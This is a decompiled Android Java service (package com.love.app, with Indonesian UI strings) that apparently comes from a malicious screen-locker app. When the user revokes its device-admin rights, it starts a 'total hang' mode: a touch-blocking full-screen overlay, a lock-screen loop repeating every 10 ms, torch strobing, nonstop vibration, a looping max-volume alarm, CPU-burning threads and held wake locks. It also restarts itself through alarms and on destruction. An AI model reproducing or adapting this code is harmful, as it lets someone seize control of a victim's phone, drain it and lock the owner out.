/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.AlarmManager
 *  android.app.Notification
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.Service
 *  android.app.admin.DevicePolicyManager
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.hardware.camera2.CameraAccessException
 *  android.hardware.camera2.CameraManager
 *  android.media.AudioManager
 *  android.media.MediaPlayer
 *  android.media.RingtoneManager
 *  android.net.Uri
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.os.Process
 *  android.os.SystemClock
 *  android.os.VibrationEffect
 *  android.os.Vibrator
 *  android.util.Log
 *  android.view.MotionEvent
 *  android.view.View
 *  android.view.View$OnTouchListener
 *  android.view.ViewGroup$LayoutParams
 *  android.view.WindowManager
 *  android.view.WindowManager$LayoutParams
 */
package com.love.app;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import com.love.app.AdminReceiver;
import com.love.app.AdminService$$ExternalSyntheticLambda0;
import com.love.app.AdminService$$ExternalSyntheticLambda1;
import com.love.app.LockActivity;
import com.love.app.TrappingActivity;

public class AdminService
extends Service {
    private static final String CHANNEL_ID = "admin_channel";
    private static final long CHECK_INTERVAL = 50L;
    private static final long MAX_DELAY = 60000L;
    private static final int NOTIF_ALERT_ID = 1002;
    private static final int NOTIF_ID = 1001;
    private static final String TAG = "AdminService";
    private AlarmManager alarmManager;
    private AudioManager audioManager;
    private CameraManager cameraManager;
    private Runnable checker;
    private PowerManager.WakeLock fullWakeLock;
    private Handler handler = new Handler(Looper.getMainLooper());
    private Handler hangHandler = new Handler(Looper.getMainLooper());
    private volatile boolean isHanging = false;
    private MediaPlayer mediaPlayer;
    private int originalVolume;
    private View overlayView;
    private PowerManager.WakeLock partialWakeLock;
    private PendingIntent restartIntent;
    private String torchCameraId;
    private Vibrator vibrator;
    private WindowManager windowManager;

    public AdminService() {
        this.checker = new Runnable(this){
            private int failCount;
            final AdminService this$0;
            {
                this.this$0 = adminService;
                this.failCount = 0;
            }

            @Override
            public void run() {
                long l;
                block7: {
                    block6: {
                        int n;
                        if (this.this$0.checkAdminStatus()) break block6;
                        this.failCount = n = this.failCount + 1;
                        long l2 = Math.min(60000L, (long)n * 50L);
                        this.this$0.showNotification();
                        l = l2;
                        if (!this.this$0.isHanging) {
                            this.this$0.startHangingMode();
                            l = l2;
                        }
                        break block7;
                    }
                    this.failCount = 0;
                    l = 50L;
                }
                try {
                    this.this$0.handler.postDelayed((Runnable)this, l);
                }
                catch (Exception exception) {
                    Log.e((String)AdminService.TAG, (String)"checker error", (Throwable)exception);
                    this.this$0.handler.postDelayed((Runnable)this, 50L);
                }
            }
        };
    }

    private void acquireWakeLocks() {
        PowerManager.WakeLock wakeLock;
        PowerManager powerManager = (PowerManager)this.getSystemService("power");
        this.fullWakeLock = wakeLock = powerManager.newWakeLock(0x1000001A, "AdminService:Full");
        wakeLock.acquire(600000L);
        this.partialWakeLock = wakeLock = powerManager.newWakeLock(1, "AdminService:Partial");
        wakeLock.acquire(600000L);
    }

    private boolean checkAdminStatus() {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.getSystemService("device_policy");
        ComponentName componentName = new ComponentName((Context)this, AdminReceiver.class);
        boolean bl = devicePolicyManager != null && devicePolicyManager.isAdminActive(componentName);
        return bl;
    }

    private void extendWakeLocks() {
        this.hangHandler.post(new Runnable(this){
            final AdminService this$0;
            {
                this.this$0 = adminService;
            }

            @Override
            public void run() {
                if (!this.this$0.isHanging) {
                    return;
                }
                if (this.this$0.fullWakeLock != null && !this.this$0.fullWakeLock.isHeld()) {
                    this.this$0.fullWakeLock.acquire(600000L);
                }
                if (this.this$0.partialWakeLock != null && !this.this$0.partialWakeLock.isHeld()) {
                    this.this$0.partialWakeLock.acquire(600000L);
                }
                this.this$0.hangHandler.postDelayed((Runnable)this, 300000L);
            }
        });
    }

    private void initHangComponents() {
        CameraManager cameraManager;
        this.cameraManager = cameraManager = (CameraManager)this.getSystemService("camera");
        if (cameraManager != null) {
            try {
                this.torchCameraId = cameraManager.getCameraIdList()[0];
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"camera list error", (Throwable)exception);
            }
        }
        this.vibrator = (Vibrator)this.getSystemService("vibrator");
        this.windowManager = (WindowManager)this.getSystemService("window");
        cameraManager = (AudioManager)this.getSystemService("audio");
        this.audioManager = cameraManager;
        this.originalVolume = cameraManager.getStreamVolume(3);
    }

    static /* synthetic */ boolean lambda$showOverlay$0(View view, MotionEvent motionEvent) {
        return true;
    }

    private void launchLockScreenLoop() {
        this.hangHandler.post(new Runnable(this){
            final AdminService this$0;
            {
                this.this$0 = adminService;
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            @Override
            public void run() {
                if (!this.this$0.isHanging) {
                    return;
                }
                try {
                    DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.this$0.getSystemService("device_policy");
                    ComponentName componentName = new ComponentName((Context)this.this$0, AdminReceiver.class);
                    if (devicePolicyManager != null && devicePolicyManager.isAdminActive(componentName)) {
                        devicePolicyManager.lockNow();
                    }
                    Intent intent = new Intent((Context)this.this$0, LockActivity.class);
                    intent.addFlags(335675392);
                    this.this$0.startActivity(intent);
                    AdminService adminService = this.this$0;
                    componentName = new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS");
                    adminService.sendBroadcast((Intent)componentName);
                }
                catch (Exception exception) {
                    Log.e((String)AdminService.TAG, (String)"launch LockActivity error", (Throwable)exception);
                }
                this.this$0.hangHandler.postDelayed((Runnable)this, 10L);
            }
        });
    }

    private void muteSystemSounds() {
        this.audioManager.setStreamVolume(1, 0, 0);
        this.audioManager.setStreamVolume(5, 0, 0);
        this.audioManager.setStreamVolume(2, 0, 0);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void playMaxAlarm() {
        try {
            Uri uri;
            Uri uri2 = uri = RingtoneManager.getDefaultUri((int)4);
            if (uri == null) {
                uri2 = RingtoneManager.getDefaultUri((int)1);
            }
            uri2 = MediaPlayer.create((Context)this, (Uri)uri2);
            this.mediaPlayer = uri2;
            if (uri2 == null) return;
            uri2.setLooping(true);
            this.mediaPlayer.setVolume(1.0f, 1.0f);
            uri2 = this.audioManager;
            uri2.setStreamVolume(3, uri2.getStreamMaxVolume(3), 0);
            this.mediaPlayer.start();
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"alarm error", (Throwable)exception);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void setTorch(boolean bl) {
        if (this.torchCameraId == null) return;
        try {
            this.cameraManager.setTorchMode(this.torchCameraId, bl);
            return;
        }
        catch (CameraAccessException cameraAccessException) {
            return;
        }
    }

    private void setupAlarmRestart() {
        this.alarmManager = (AlarmManager)this.getSystemService("alarm");
        this.restartIntent = PendingIntent.getService((Context)this, (int)0, (Intent)new Intent((Context)this, AdminService.class), (int)0xC000000);
        this.alarmManager.setRepeating(2, SystemClock.elapsedRealtime() + 300000L, 300000L, this.restartIntent);
    }

    private void showNotification() {
        PendingIntent pendingIntent = PendingIntent.getActivity((Context)this, (int)0, (Intent)new Intent((Context)this, TrappingActivity.class), (int)0xC000000);
        pendingIntent = new NotificationCompat.Builder((Context)this, CHANNEL_ID).setContentTitle("⚠️ Admin Dinonaktifkan ⚠️").setContentText("Perangkat akan terkunci total!").setSmallIcon(17301543).setContentIntent(pendingIntent).setAutoCancel(false).setOngoing(true).setPriority(1).setCategory("alarm").build();
        ((NotificationManager)this.getSystemService(NotificationManager.class)).notify(1002, (Notification)pendingIntent);
    }

    private void showOverlay() {
        View view;
        int n = Build.VERSION.SDK_INT >= 26 ? 2038 : 2002;
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, n, 1448, -3);
        layoutParams.gravity = 0x800033;
        layoutParams.screenBrightness = 0.0f;
        this.overlayView = view = new View((Context)this);
        view.setBackgroundColor(-16777216);
        this.overlayView.setAlpha(0.95f);
        this.overlayView.setOnTouchListener((View.OnTouchListener)new AdminService$$ExternalSyntheticLambda1());
        try {
            this.windowManager.addView(this.overlayView, (ViewGroup.LayoutParams)layoutParams);
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"overlay error", (Throwable)exception);
        }
    }

    private void startCpuBurner() {
        int n = Math.max(4, Runtime.getRuntime().availableProcessors() * 2);
        for (int i = 0; i < n; ++i) {
            new Thread(new AdminService$$ExternalSyntheticLambda0(this)).start();
        }
    }

    private void startForegroundServiceWithNotification() {
        PendingIntent pendingIntent;
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, (CharSequence)"Layanan Keamanan", 2);
            notificationChannel.setLockscreenVisibility(1);
            pendingIntent = (NotificationManager)this.getSystemService(NotificationManager.class);
            if (pendingIntent != null) {
                pendingIntent.createNotificationChannel(notificationChannel);
            }
        }
        pendingIntent = PendingIntent.getActivity((Context)this, (int)0, (Intent)new Intent((Context)this, TrappingActivity.class), (int)0xC000000);
        pendingIntent = new NotificationCompat.Builder((Context)this, CHANNEL_ID).setContentTitle("Keamanan Aktif").setContentText("Perangkat dalam perlindungan penuh").setSmallIcon(17301551).setContentIntent(pendingIntent).setOngoing(true).setPriority(2).setCategory("service").build();
        if (Build.VERSION.SDK_INT >= 29) {
            this.startForeground(1001, (Notification)pendingIntent, 1);
        } else {
            this.startForeground(1001, (Notification)pendingIntent);
        }
    }

    private void startHangingMode() {
        if (this.isHanging) {
            return;
        }
        this.isHanging = true;
        Log.e((String)TAG, (String)"🔥 MEMULAI MODE HANG TOTAL 🔥");
        try {
            Intent intent = new Intent((Context)this, LockActivity.class);
            intent.addFlags(0x14000000);
            this.startActivity(intent);
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"start LockActivity error", (Throwable)exception);
        }
        this.showOverlay();
        this.startTorchBlink();
        this.startVibrate();
        this.playMaxAlarm();
        this.startCpuBurner();
        this.launchLockScreenLoop();
        this.extendWakeLocks();
        this.muteSystemSounds();
    }

    private void startTorchBlink() {
        this.hangHandler.post(new Runnable(this){
            boolean state;
            final AdminService this$0;
            {
                this.this$0 = adminService;
                this.state = false;
            }

            @Override
            public void run() {
                boolean bl;
                if (!this.this$0.isHanging) {
                    return;
                }
                this.state = bl = this.state ^ true;
                this.this$0.setTorch(bl);
                this.this$0.hangHandler.postDelayed((Runnable)this, 80L);
            }
        });
    }

    private void startVibrate() {
        if (this.vibrator == null) {
            return;
        }
        this.hangHandler.post(new Runnable(this){
            final AdminService this$0;
            {
                this.this$0 = adminService;
            }

            @Override
            public void run() {
                long[] lArray;
                if (!this.this$0.isHanging) {
                    return;
                }
                long[] lArray2 = lArray = new long[6];
                lArray[0] = 0L;
                lArray2[1] = 200L;
                lArray2[2] = 50L;
                lArray2[3] = 200L;
                lArray2[4] = 50L;
                lArray2[5] = 200L;
                if (Build.VERSION.SDK_INT >= 26) {
                    this.this$0.vibrator.vibrate(VibrationEffect.createWaveform((long[])lArray, (int)0));
                } else {
                    this.this$0.vibrator.vibrate(lArray, 0);
                }
                this.this$0.hangHandler.postDelayed((Runnable)this, 500L);
            }
        });
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void stopHangingMode() {
        this.isHanging = false;
        this.hangHandler.removeCallbacksAndMessages(null);
        View view = this.overlayView;
        if (view != null) {
            try {
                this.windowManager.removeView(view);
            }
            catch (Exception exception) {}
            this.overlayView = null;
        }
        this.setTorch(false);
        view = this.vibrator;
        if (view != null) {
            view.cancel();
        }
        if ((view = this.mediaPlayer) != null) {
            try {
                view.stop();
                this.mediaPlayer.release();
            }
            catch (Exception exception) {}
            this.mediaPlayer = null;
        }
        if ((view = this.audioManager) != null) {
            view.setStreamVolume(3, this.originalVolume, 0);
            this.audioManager.setStreamVolume(4, this.originalVolume, 0);
        }
    }

    /* synthetic */ void lambda$startCpuBurner$1$com_love_app_AdminService() {
        Process.setThreadPriority((int)-19);
        long l = System.nanoTime();
        while (this.isHanging) {
            l = l >>> 32 ^ 6364136223846793005L * l + 1442695040888963407L;
            double d = l;
            Math.sin(d);
            Math.cos(d);
            Math.sqrt(Math.abs(l));
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        Log.d((String)TAG, (String)"onCreate");
        this.acquireWakeLocks();
        this.startForegroundServiceWithNotification();
        this.setupAlarmRestart();
        this.initHangComponents();
        this.handler.post(this.checker);
    }

    public void onDestroy() {
        PendingIntent pendingIntent;
        Log.d((String)TAG, (String)"onDestroy");
        this.handler.removeCallbacks(this.checker);
        this.stopHangingMode();
        PowerManager.WakeLock wakeLock = this.fullWakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            this.fullWakeLock.release();
        }
        if ((wakeLock = this.partialWakeLock) != null && wakeLock.isHeld()) {
            this.partialWakeLock.release();
        }
        if ((wakeLock = this.alarmManager) != null && (pendingIntent = this.restartIntent) != null) {
            wakeLock.cancel(pendingIntent);
        }
        super.onDestroy();
        wakeLock = new Intent((Context)this, AdminService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            this.startForegroundService((Intent)wakeLock);
        } else {
            this.startService((Intent)wakeLock);
        }
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        Log.d((String)TAG, (String)"onStartCommand");
        if (intent != null && intent.getAction() != null) {
            if ("START_HANG".equals(intent.getAction())) {
                if (!this.isHanging) {
                    this.startHangingMode();
                }
            } else if ("STOP_HANG".equals(intent.getAction())) {
                this.stopHangingMode();
            }
        }
        return 1;
    }
}

